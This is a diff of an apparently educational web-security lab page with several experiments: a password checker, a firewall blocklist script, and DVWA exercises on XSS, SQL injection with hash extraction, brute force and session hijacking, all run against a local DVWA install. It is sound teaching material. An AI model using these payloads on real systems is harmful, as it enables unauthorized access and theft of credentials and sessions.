+        <p>Write a Python program that evaluates a password as <em>Weak</em>, <em>Medium</em>, or <em>Strong</em> based on length, digit, case, and special-character rules.</p>
       </div>
-      <div class="step-body">
-        <pre>emulator -list-avds
-<span class="comment"># Output: Pixel_9  (or Pixel_2 etc.)</span></pre>
+
+      <div class="section">
+        <div class="section-label">Rules</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">R1</span><span class="step-text">Minimum <strong>8 characters</strong> in length</span></li>
+          <li class="step"><span class="step-num">R2</span><span class="step-text">At least one <strong>digit</strong> (0–9)</span></li>
+          <li class="step"><span class="step-num">R3</span><span class="step-text">At least one <strong>uppercase</strong> letter</span></li>
+          <li class="step"><span class="step-num">R4</span><span class="step-text">At least one <strong>lowercase</strong> letter</span></li>
+          <li class="step"><span class="step-num">R5</span><span class="step-text">At least one <strong>special character</strong> (e.g. <code>!@#$%^&*()</code>)</span></li>
+        </ul>
       </div>
+
+      <div class="section">
+        <div class="section-label">Program — password_checker.py</div>
+        <div class="code-block"><pre><span class="kw">import</span> re
+
+<span class="kw">def</span> <span class="fn">check_password_strength</span>(password):
+    <span class="kw">if</span> len(password) &lt; <span class="num">8</span>:
+        <span class="kw">return</span> <span class="str">"Weak: Password must be at least 8 characters long."</span>
+    <span class="kw">if not</span> any(char.isdigit() <span class="kw">for</span> char <span class="kw">in</span> password):
+        <span class="kw">return</span> <span class="str">"Weak: Password must include at least one number."</span>
+    <span class="kw">if not</span> any(char.isupper() <span class="kw">for</span> char <span class="kw">in</span> password):
+        <span class="kw">return</span> <span class="str">"Weak: Password must include at least one uppercase letter."</span>
+    <span class="kw">if not</span> any(char.islower() <span class="kw">for</span> char <span class="kw">in</span> password):
+        <span class="kw">return</span> <span class="str">"Weak: Password must include at least one lowercase letter."</span>
+    <span class="kw">if not</span> re.search(<span class="str">r'[!@#$%^&amp;*(),.?":{}|&lt;&gt;]'</span>, password):
+        <span class="kw">return</span> <span class="str">"Medium: Add special characters to make your password stronger."</span>
+    <span class="kw">return</span> <span class="str">"Strong: Your password is secure!"</span>
+
+<span class="kw">def</span> <span class="fn">password_checker</span>():
+    print(<span class="str">"Welcome to the Password Strength Checker!"</span>)
+    <span class="kw">while</span> True:
+        password = input(<span class="str">"\nEnter your password (or type 'exit' to quit): "</span>)
+        <span class="kw">if</span> password.lower() == <span class="str">"exit"</span>:
+            print(<span class="str">"Goodbye!"</span>)
+            <span class="kw">break</span>
+        print(<span class="fn">check_password_strength</span>(password))
+
+<span class="kw">if</span> __name__ == <span class="str">"__main__"</span>:
+    <span class="fn">password_checker</span>()</pre></div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Sample Output</div>
+        <div class="output-block">
+          <div class="output-line inp">Enter your password: <strong>abc123</strong></div>
+          <div class="output-line">→ Weak: Password must be at least 8 characters long.</div>
+          <br>
+          <div class="output-line inp">Enter your password: <strong>Abcdef12</strong></div>
+          <div class="output-line">→ Medium: Add special characters to make your password stronger.</div>
+          <br>
+          <div class="output-line inp">Enter your password: <strong>Abc@1234</strong></div>
+          <div class="output-line">→ Strong: Your password is secure!</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Execution Steps</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">01</span><span class="step-text">Open Command Prompt or VS Code Terminal.</span></li>
+          <li class="step"><span class="step-num">02</span><span class="step-text">Navigate to the folder: <code>cd path\to\folder</code></span></li>
+          <li class="step"><span class="step-num">03</span><span class="step-text">Run: <code>python password_checker.py</code></span></li>
+          <li class="step"><span class="step-num">04</span><span class="step-text">Enter passwords to test. Type <code>exit</code> to quit.</span></li>
+        </ul>
+      </div>
+
     </div>
+  </div>
 
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#00c89620;color:var(--e15);">3</div>
-        <div class="step-title">Start Emulator with Burp Proxy</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+  <!-- EXP 4 -->
+  <div class="experiment" onclick="toggle(this)">
+    <div class="exp-header">
+      <div class="exp-number" id="exp04">04</div>
+      <div class="exp-title-wrap">
+        <div class="exp-title">Basic Firewall Configuration</div>
+        <div class="exp-subtitle">Windows Defender · Python · PowerShell · netsh</div>
       </div>
-      <div class="step-body">
-        <div class="note">10.0.2.2 is how the Android emulator reaches the Windows host machine.</div>
-        <pre>emulator -avd Pixel_9 -http-proxy http://10.0.2.2:8080</pre>
-      </div>
+      <div class="exp-toggle">▾</div>
     </div>
+    <div class="exp-body">
 
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#00c89620;color:var(--e15);">4</div>
-        <div class="step-title">Configure Burp Suite to Accept All Interfaces</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <div class="section">
+        <div class="section-label">Objective</div>
+        <p>Configure Windows Defender Firewall to block known malicious IP addresses — both manually via the GUI and automatically using a Python script that fetches a live blocklist.</p>
       </div>
-      <div class="step-body">
-        <div class="note">Do this inside Burp Suite GUI — not terminal.</div>
-        <pre>Proxy → Proxy Settings → Proxy Listeners → Edit
-→ Binding tab → Select: All interfaces → OK
-→ Intercept ON</pre>
+
+      <div class="section">
+        <div class="section-label">Requirements</div>
+        <div class="tools">
+          <span class="tool-pill">Python 3.x</span>
+          <span class="tool-pill">Windows OS</span>
+          <span class="tool-pill">PowerShell</span>
+          <span class="tool-pill">VS Code / Any IDE</span>
+          <span class="tool-pill">Internet Connection</span>
+        </div>
       </div>
+
+      <div class="section">
+        <div class="section-label">Part A — Manual Firewall Rule (GUI)</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">01</span><span class="step-text">Open <strong>Windows Defender Firewall with Advanced Security</strong>.</span></li>
+          <li class="step"><span class="step-num">02</span><span class="step-text">Click <strong>Inbound Rules</strong> → <strong>New Rule</strong> in the right panel.</span></li>
+          <li class="step"><span class="step-num">03</span><span class="step-text">Select <strong>Custom</strong> → All Programs → default Protocol & Ports → click Next.</span></li>
+          <li class="step"><span class="step-num">04</span><span class="step-text">Under <strong>Scope → Remote IP address</strong>, select "These IP addresses" → Add the IP (e.g. <code>1.2.3.4</code>) → OK → Next.</span></li>
+          <li class="step"><span class="step-num">05</span><span class="step-text">Action: <strong>Block the connection</strong> → Profile: Domain, Private, Public → Name: <code>Manual_Block_IP</code> → Finish.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Part B — Automated Script (firewall.py)</div>
+        <div class="code-block"><pre><span class="kw">import</span> requests, csv, subprocess
+
+<span class="cm"># Source: Abuse CH IP blocklist</span>
+response = requests.get(
+    <span class="str">"https://feodotracker.abuse.ch/downloads/ipblocklist.csv"</span>
+).text
+
+<span class="cm"># Remove any existing BadIP rules</span>
+rule = <span class="str">'netsh advfirewall firewall delete rule name="BadIP"'</span>
+subprocess.run([<span class="str">"PowerShell"</span>, <span class="str">"-Command"</span>, rule])
+
+mycsv = csv.reader(
+    filter(<span class="kw">lambda</span> x: <span class="kw">not</span> x.startswith(<span class="str">"#"</span>), response.splitlines())
+)
+
+<span class="kw">for</span> row <span class="kw">in</span> mycsv:
+    ip = row[<span class="num">1</span>]
+    <span class="kw">if</span> ip != <span class="str">"dst_ip"</span>:
+        print(<span class="str">"Added Rule to block:"</span>, ip)
+        rule = (
+            <span class="str">"netsh advfirewall firewall add rule name='BadIP' "</span>
+            <span class="str">"Dir=Out Action=Block RemoteIP="</span> + ip
+        )
+        subprocess.run([<span class="str">"PowerShell"</span>, <span class="str">"-Command"</span>, rule])</pre></div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Sample Output</div>
+        <div class="output-block">
+          <div class="output-line">Added Rule to block: 45.9.148.221</div>
+          <div class="output-line">Added Rule to block: 103.17.48.5</div>
+          <div class="output-line">Added Rule to block: 185.234.219.12</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Execution Steps</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">01</span><span class="step-text">Open Command Prompt as <strong>Administrator</strong> (firewall rules require admin rights).</span></li>
+          <li class="step"><span class="step-num">02</span><span class="step-text">Navigate to the script folder: <code>cd C:\Users\YourName\Desktop</code></span></li>
+          <li class="step"><span class="step-num">03</span><span class="step-text">Verify Python: <code>python --version</code></span></li>
+          <li class="step"><span class="step-num">04</span><span class="step-text">Install dependency: <code>python -m pip install requests</code></span></li>
+          <li class="step"><span class="step-num">05</span><span class="step-text">Run the script: <code>python firewall.py</code></span></li>
+          <li class="step"><span class="step-num">06</span><span class="step-text">Verify rules: Open <strong>Windows Defender Firewall</strong> → Outbound Rules → search for <code>BadIP</code>.</span></li>
+        </ul>
+      </div>
+
     </div>
+  </div>
 
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#00c89620;color:var(--e15);">5</div>
-        <div class="step-title">Set Proxy via ADB (if emulator settings don't save)</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+  <!-- EXP 5 — XSS -->
+  <div class="experiment" onclick="toggle(this)">
+    <div class="exp-header">
+      <div class="exp-number" id="exp05">05</div>
+      <div class="exp-title-wrap">
+        <div class="exp-title">XSS Vulnerabilities using DVWA</div>
+        <div class="exp-subtitle">Reflected · Stored · DOM-Based · Cookie Theft · Kali Linux</div>
       </div>
-      <div class="step-body">
-        <pre><span class="comment"># Open a NEW CMD window:</span>
-cd C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools
+      <div class="exp-toggle">▾</div>
+    </div>
+    <div class="exp-body">
+
+      <div class="section">
+        <div class="section-label">Aim</div>
+        <p>Identify and exploit Cross-Site Scripting (XSS) vulnerabilities in DVWA — covering Reflected, Stored, and DOM-Based types to understand how JavaScript injection works in a browser context.</p>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Requirements</div>
+        <div class="tools">
+          <span class="tool-pill">Kali Linux</span>
+          <span class="tool-pill">DVWA</span>
+          <span class="tool-pill">Apache &amp; MySQL</span>
+          <span class="tool-pill">Firefox / Chromium</span>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 1 — Start Services &amp; Login</div>
+        <div class="code-block"><pre><span class="cm"># Start Apache web server</span>
+sudo service apache2 start
+
+<span class="cm"># Start MySQL database</span>
+sudo service mysql start</pre></div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">→</span><span class="step-text">Open Firefox → go to <code>http://localhost/dvwa</code></span></li>
+          <li class="step"><span class="step-num">→</span><span class="step-text">Login: Username: <code>admin</code> / Password: <code>password</code></span></li>
+          <li class="step"><span class="step-num">→</span><span class="step-text">Go to <strong>DVWA Security</strong> → set level to <strong>Low</strong> → Submit</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 2 — XSS Types (Theory)</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">R</span><span class="step-text"><strong>Reflected XSS</strong> — payload injected via URL/input, reflected back once; not stored.</span></li>
+          <li class="step"><span class="step-num">S</span><span class="step-text"><strong>Stored XSS</strong> — payload saved in database, executes every time the page loads for any user.</span></li>
+          <li class="step"><span class="step-num">D</span><span class="step-text"><strong>DOM-Based XSS</strong> — payload processed by client-side JavaScript via the URL fragment.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 3 — Reflected XSS</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">→</span><span class="step-text">Navigate: DVWA → <strong>XSS (Reflected)</strong></span></li>
+          <li class="step"><span class="step-num">→</span><span class="step-text">In the "What's your name?" input box, type the payload below and click <strong>Submit</strong></span></li>
+        </ul>
+        <div class="code-block"><pre><span class="str">&lt;script&gt;alert('XSS')&lt;/script&gt;</span></pre></div>
+        <div class="output-block">
+          <div class="output-line">✔ Browser shows popup alert → XSS vulnerability confirmed</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 4 — Stored XSS</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">→</span><span class="step-text">Navigate: DVWA → <strong>XSS (Stored)</strong></span></li>
+          <li class="step"><span class="step-num">→</span><span class="step-text">Fill the guestbook form with the payloads below and click <strong>Sign Guestbook</strong></span></li>
+        </ul>
+        <div class="code-block"><pre><span class="cm"># Name field:</span>
+<span class="str">&lt;h1&gt;Hacked&lt;/h1&gt;</span>
+
+<span class="cm"># Message field:</span>
+<span class="str">&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</span></pre></div>
+        <div class="output-block">
+          <div class="output-line">✔ Popup fires every page refresh → Stored XSS confirmed</div>
+          <div class="output-line inp">Page title renders as bold "Hacked" — HTML injection works too</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 5 — DOM-Based XSS</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">→</span><span class="step-text">Navigate: DVWA → <strong>XSS (DOM)</strong></span></li>
+          <li class="step"><span class="step-num">→</span><span class="step-text">Append the payload directly to the URL in the address bar and press Enter</span></li>
+        </ul>
+        <div class="code-block"><pre><span class="cm"># Add this to the page URL in the browser address bar:</span>
+<span class="str">#&lt;script&gt;alert('DOM XSS')&lt;/script&gt;</span>
+
+<span class="cm"># Full URL looks like:</span>
+http://localhost/dvwa/vulnerabilities/xss_d/<span class="str">#&lt;script&gt;alert('DOM XSS')&lt;/script&gt;</span></pre></div>
+        <div class="output-block">
+          <div class="output-line">✔ Popup appears → DOM XSS confirmed</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 6 — Cookie Capture (Session Theft Demo)</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">→</span><span class="step-text">In the Stored XSS Message box, enter the cookie-stealing payload below and click Sign Guestbook</span></li>
+        </ul>
+        <div class="code-block"><pre><span class="str">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
+
+<span class="cm"># Result shows something like:</span>
+<span class="cm"># security=low; PHPSESSID=54eb55i7059b3a590853ea27a49619f6</span></pre></div>
+        <div class="output-block">
+          <div class="output-line">✔ Session cookie visible in alert box → session theft is possible over HTTP</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 7 — Change Security Level &amp; Observe Filtering</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">→</span><span class="step-text">Go to <strong>DVWA Security</strong> → set level to <strong>Medium</strong>, then <strong>High</strong> → Submit</span></li>
+          <li class="step"><span class="step-num">→</span><span class="step-text">Repeat the same payloads and observe how input filtering blocks or escapes them at each level.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Result</div>
+        <div class="conclusion">
+          <p class="conclusion-text">All three types of XSS — Reflected, Stored, and DOM-Based — were successfully exploited on DVWA at Low security. Cookie theft via <code>document.cookie</code> confirmed session hijacking risk. Higher security levels showed progressive filtering, proving the importance of output encoding and input validation.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- EXP 6 — SQL Injection -->
+  <div class="experiment" onclick="toggle(this)">
+    <div class="exp-header">
+      <div class="exp-number" id="exp06">06</div>
+      <div class="exp-title-wrap">
+        <div class="exp-title">SQL Injection Attack</div>
+        <div class="exp-subtitle">Auth Bypass · UNION · DB Enumeration · Data Extraction · DVWA</div>
+      </div>
+      <div class="exp-toggle">▾</div>
+    </div>
+    <div class="exp-body">
+
+      <div class="section">
+        <div class="section-label">Aim</div>
+        <p>Understand how SQL Injection vulnerabilities occur and how attackers exploit improper input validation to bypass authentication and extract complete database information from DVWA.</p>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Requirements</div>
+        <div class="tools">
+          <span class="tool-pill">Kali Linux</span>
+          <span class="tool-pill">DVWA / WebGoat</span>
+          <span class="tool-pill">Apache &amp; MySQL (MariaDB)</span>
+          <span class="tool-pill">Firefox</span>
+          <span class="tool-pill">Basic SQL Knowledge</span>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Setup — Install &amp; Start DVWA</div>
+        <div class="code-block"><pre><span class="cm"># Step 1: Install DVWA</span>
+sudo apt update
+sudo apt install dvwa -y
+
+<span class="cm"># Step 2: Start required services</span>
+sudo service apache2 start
+sudo service mysql start
+
+<span class="cm"># Step 3: Edit DVWA config (set empty DB password)</span>
+sudo nano /etc/dvwa/config.inc.php
+<span class="cm"># Ensure this line exists:</span>
+$_DVWA[<span class="str">'db_password'</span>] = <span class="str">''</span>;</pre></div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">→</span><span class="step-text">Open Firefox → <code>http://127.0.0.1/dvwa</code> → Login: <code>admin</code> / <code>password</code></span></li>
+          <li class="step"><span class="step-num">→</span><span class="step-text">Click <strong>Create / Reset Database</strong> → then go to <strong>DVWA Security</strong> → set <strong>Low</strong> → Submit</span></li>
+          <li class="step"><span class="step-num">→</span><span class="step-text">Navigate: DVWA → Vulnerabilities → <strong>SQL Injection</strong> (User ID input box appears)</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 7 — Normal Input Test</div>
+        <div class="code-block"><pre><span class="cm"># Enter in the User ID box:</span>
+<span class="num">1</span>
+<span class="cm"># Output: ID=1, First name: admin, Surname: admin</span></pre></div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 8 — Authentication Bypass</div>
+        <div class="code-block"><pre><span class="cm"># Classic OR-based bypass — enter in User ID box:</span>
+<span class="str">1' OR '1'='1</span>
+
+<span class="cm"># Result: ALL user records dumped</span>
+<span class="cm"># Confirms SQL Injection vulnerability</span></pre></div>
+        <div class="output-block">
+          <div class="output-line">ID: 1' or '1'='1 → First name: admin, Surname: admin</div>
+          <div class="output-line">ID: 1' or '1'='1 → First name: Gordon, Surname: Brown</div>
+          <div class="output-line">ID: 1' or '1'='1 → First name: Hack, Surname: Me</div>
+          <div class="output-line">... (all records shown)</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 9 — Find Number of Columns (ORDER BY)</div>
+        <div class="code-block"><pre><span class="cm"># Try incrementing until error occurs:</span>
+<span class="str">1' ORDER BY 1-- -</span>   <span class="cm"># works</span>
+<span class="str">1' ORDER BY 2-- -</span>   <span class="cm"># works</span>
+<span class="str">1' ORDER BY 3-- -</span>   <span class="cm"># ERROR → 2 columns confirmed</span>
+
+<span class="cm"># Last successful number = total column count</span></pre></div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 10 — UNION-Based Injection</div>
+        <div class="code-block"><pre><span class="cm"># Identify which columns are visible in output:</span>
+<span class="str">1' UNION SELECT 1,2-- -</span>
+
+<span class="cm"># Output shows "1" and "2" in First name / Surname fields</span>
+<span class="cm"># Both columns are injectable</span></pre></div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 11 — Extract Database Name</div>
+        <div class="code-block"><pre><span class="str">1' UNION SELECT database(),2-- -</span>
+
+<span class="cm"># Output First name: dvwa ← current database name</span></pre></div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 12 — Extract Table Names</div>
+        <div class="code-block"><pre><span class="str">1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -</span>
+
+<span class="cm"># Output tables: admin, guestbook, users</span></pre></div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 13 — Extract Column Names</div>
+        <div class="code-block"><pre><span class="str">1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -</span>
+
+<span class="cm"># Columns found: user_id, first_name, last_name, user, password, ...</span></pre></div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Step 14 — Extract Usernames &amp; Password Hashes</div>
+        <div class="code-block"><pre><span class="str">1' UNION SELECT user,password FROM users-- -</span></pre></div>
+        <div class="output-block">
+          <div class="output-line">First name: admin → Surname: 5f4dcc3b5aa765d61d8327deb882cf99</div>
+          <div class="output-line">First name: gordonb → Surname: e99a18c428cb38d5f260853678922e03</div>
+          <div class="output-line">First name: 1337 → Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</div>
+          <div class="output-line inp">Passwords are MD5 hashes — crack with hashcat or online tools</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Prevention Techniques (Viva)</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">✓</span><span class="step-text"><strong>Prepared Statements</strong> (Parameterized Queries) — most effective defense</span></li>
+          <li class="step"><span class="step-num">✓</span><span class="step-text"><strong>Input Validation &amp; Sanitization</strong> — reject or escape special characters</span></li>
+          <li class="step"><span class="step-num">✓</span><span class="step-text"><strong>Stored Procedures</strong> — limit dynamic SQL usage</span></li>
+          <li class="step"><span class="step-num">✓</span><span class="step-text"><strong>Web Application Firewalls (WAF)</strong> — detect &amp; block injection patterns</span></li>
+          <li class="step"><span class="step-num">✓</span><span class="step-text"><strong>Least Privilege DB Access</strong> — DB user should only have SELECT, not DROP/ALTER</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Viva Questions</div>
+        <div class="qa-item"><span class="qa-q">Q1</span><span class="qa-a">What is SQL Injection? — Inserting malicious SQL into input fields to manipulate database queries.</span></div>
+        <div class="qa-item"><span class="qa-q">Q2</span><span class="qa-a">Why does <code>1' OR '1'='1</code> work? — It makes the WHERE condition always TRUE, returning all rows.</span></div>
+        <div class="qa-item"><span class="qa-q">Q3</span><span class="qa-a">Difference between UNION-based and Error-based SQLi? — UNION appends extra query results; Error-based extracts data through DB error messages.</span></div>
+        <div class="qa-item"><span class="qa-q">Q4</span><span class="qa-a">What is <code>information_schema</code>? — A built-in MySQL metadata database containing info about all tables, columns, and databases.</span></div>
+        <div class="qa-item"><span class="qa-q">Q5</span><span class="qa-a">How to prevent SQL Injection? — Use prepared statements / parameterized queries with input validation.</span></div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Result</div>
+        <div class="conclusion">
+          <p class="conclusion-text">SQL Injection was successfully performed — demonstrating authentication bypass, unauthorized data access, and full database enumeration. This proves that unsanitized user input is a critical vulnerability requiring mandatory security controls.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- EXP 7 — Auth Weaknesses & Session Management -->
+  <div class="experiment" onclick="toggle(this)">
+    <div class="exp-header">
+      <div class="exp-number" id="exp07">07</div>
+      <div class="exp-title-wrap">
+        <div class="exp-title">Authentication Weaknesses &amp; Session Management</div>
+        <div class="exp-subtitle">Brute Force · Session Hijacking · Session Fixation · Improper Logout</div>
+      </div>
+      <div class="exp-toggle">▾</div>
+    </div>
+    <div class="exp-body">
+
+      <div class="section">
+        <div class="section-label">Aim</div>
+        <p>Identify and analyze authentication weaknesses and session management vulnerabilities in DVWA — covering brute force attacks, session hijacking, session fixation, and improper logout behavior.</p>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Theory</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">Auth</span><span class="step-text"><strong>Authentication Weakness</strong> — caused by weak passwords, no account lockout, brute force vulnerability, default credentials.</span></li>
+          <li class="step"><span class="step-num">Sess</span><span class="step-text"><strong>Session Management</strong> — improper handling leads to session hijacking, session fixation, reuse of old session IDs, insecure cookies.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Part A — Launch DVWA</div>
+        <div class="code-block"><pre><span class="cm"># Start Apache and MySQL</span>
+sudo service apache2 start
+sudo service mysql start</pre></div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">→</span><span class="step-text">Open Firefox → <code>http://127.0.0.1/dvwa</code></span></li>
+          <li class="step"><span class="step-num">→</span><span class="step-text">Login: <code>admin</code> / <code>password</code></span></li>
+          <li class="step"><span class="step-num">→</span><span class="step-text">Go to <strong>DVWA Security</strong> → select <strong>LOW</strong> → Submit</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Part B — Exp 1: Weak Password Authentication</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">→</span><span class="step-text">Navigate: DVWA → Vulnerabilities → <strong>Brute Force</strong></span></li>
+          <li class="step"><span class="step-num">→</span><span class="step-text">Enter Username: <code>admin</code> / Password: <code>password</code> → click Login</span></li>
+          <li class="step"><span class="step-num">✔</span><span class="step-text">Login succeeds with default credential — proves <strong>weak authentication</strong>.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Part B — Exp 2: Manual Brute Force Attack</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">→</span><span class="step-text">Keep Username: <code>admin</code> (same every time). Try passwords one by one:</span></li>
+        </ul>
+        <div class="code-block"><pre><span class="cm"># Attempt 1 — fails</span>
+Username: admin   Password: admin
+
+<span class="cm"># Attempt 2 — fails</span>
+Username: admin   Password: 123456
+
+<span class="cm"># Attempt 3 — SUCCESS ✔</span>
+Username: admin   Password: password</pre></div>
+        <div class="output-block">
+          <div class="output-line">✔ LOGIN SUCCESSFUL — DVWA did NOT block, did NOT lock, allowed unlimited attempts</div>
+          <div class="output-line inp">This is called: Brute Force Vulnerability</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Part C — Exp 3: Session ID Analysis</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">01</span><span class="step-text">Login to DVWA, then right-click → <strong>Inspect</strong> → <strong>Storage</strong> → <strong>Cookies</strong></span></li>
+          <li class="step"><span class="step-num">02</span><span class="step-text">Select <code>http://127.0.0.1</code> — look for <code>PHPSESSID</code></span></li>
+        </ul>
+        <div class="output-block">
+          <div class="output-line">PHPSESSID = 5f6194766020dcaa2c906358cbd2941b</div>
+          <div class="output-line inp">⚠ Session ID is visible, unencrypted, and transmitted over HTTP</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Part C — Exp 4: Session Hijacking</div>
+        <div class="code-block"><pre><span class="cm">--- VICTIM BROWSER (Firefox normal window) ---</span>
+<span class="cm"># Step 1: Login to DVWA as admin, stay logged in</span>
+http://127.0.0.1/dvwa  →  admin / password
+
+<span class="cm"># Step 2: Copy PHPSESSID from cookies</span>
+Right-click → Inspect → Storage → Cookies → copy PHPSESSID value
+
+<span class="cm">--- ATTACKER BROWSER (Private Window: Ctrl+Shift+P) ---</span>
+<span class="cm"># Step 3: Open private window, go to DVWA (do NOT login)</span>
+http://127.0.0.1/dvwa
+
+<span class="cm"># Step 4: Paste copied PHPSESSID into attacker's cookie storage</span>
+Inspect → Storage → Cookies → Replace PHPSESSID value → Enter
+
+<span class="cm"># Step 5: Refresh the page (F5)</span></pre></div>
+        <div class="output-block">
+          <div class="output-line">✔ Attacker is now logged in as admin WITHOUT any username or password</div>
+          <div class="output-line inp">Result: Session Hijacking successful</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Part C — Exp 5: Session Fixation</div>
+        <div class="code-block"><pre><span class="cm"># Step 1: Open DVWA login page WITHOUT logging in</span>
+http://127.0.0.1/dvwa/
+
+<span class="cm"># Step 2: Note PHPSESSID BEFORE login</span>
+Inspect → Storage → Cookies
+PHPSESSID (before) = 5f6194766020dcaa2c906358cbd2941b
+
+<span class="cm"># Step 3: Login with same browser window (do NOT close)</span>
+Username: admin  Password: password  → Login
+
+<span class="cm"># Step 4: Check PHPSESSID AFTER login</span>
+Inspect → Storage → Cookies → look at PHPSESSID</pre></div>
+        <div class="output-block">
+          <div class="output-line">CASE 1 — VULNERABLE (DVWA LOW):</div>
+          <div class="output-line">  Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b</div>
+          <div class="output-line">  After  Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b  ← SAME!</div>
+          <div class="output-line inp">⚠ Session Fixation exists — attacker who knew the pre-login ID now has the session</div>
+          <br>
+          <div class="output-line">CASE 2 — SECURE (DVWA HIGH/IMPOSSIBLE):</div>
+          <div class="output-line">  After Login PHPSESSID = be2d584526b42fef6742d5cf95ce008f  ← CHANGED</div>
+          <div class="output-line inp">✔ Session regenerated on login — no fixation possible</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Part C — Exp 6: Improper Logout (Session Reuse)</div>
+        <div class="code-block"><pre><span class="cm"># Step 1: Login normally</span>
+http://127.0.0.1/dvwa/  →  admin / password
+
+<span class="cm"># Step 2: Copy PHPSESSID BEFORE logout</span>
+Inspect → Storage → Cookies → copy PHPSESSID
+Example: be2d584526b42fef6742d5cf95ce008f
+
+<span class="cm"># Step 3: Logout from DVWA</span>
+Click Logout → login page appears
+
+<span class="cm"># Step 4: Open Private Window (Ctrl+Shift+P)</span>
+<span class="cm"># Paste OLD PHPSESSID into cookies, then go to:</span>
+http://127.0.0.1/dvwa/index.php</pre></div>
+        <div class="output-block">
+          <div class="output-line">✔ Still logged in as admin using old session ID</div>
+          <div class="output-line inp">⚠ Logout did NOT destroy the server-side session — Improper Logout vulnerability</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Observations &amp; Results Summary</div>
+        <div class="qa-item"><span class="qa-q">Test</span><span class="qa-a">Weak Password Login → <strong>Successful</strong> with default credentials</span></div>
+        <div class="qa-item"><span class="qa-q">Test</span><span class="qa-a">Brute Force Attack → <strong>Allowed</strong> — no lockout, no delay, unlimited attempts</span></div>
+        <div class="qa-item"><span class="qa-q">Test</span><span class="qa-a">Session ID Exposure → <strong>Found</strong> — plaintext, visible in browser DevTools</span></div>
+        <div class="qa-item"><span class="qa-q">Test</span><span class="qa-a">Session Hijacking → <strong>Possible</strong> — reusing stolen PHPSESSID grants full access</span></div>
+        <div class="qa-item"><span class="qa-q">Test</span><span class="qa-a">Session Fixation → <strong>Observed</strong> — session ID unchanged after login on Low level</span></div>
+        <div class="qa-item"><span class="qa-q">Test</span><span class="qa-a">Improper Logout → <strong>Observed</strong> — old session ID works after logout</span></div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Viva Questions</div>
+        <div class="qa-item"><span class="qa-q">Q1</span><span class="qa-a">What is authentication? — Process of verifying identity before granting access.</span></div>
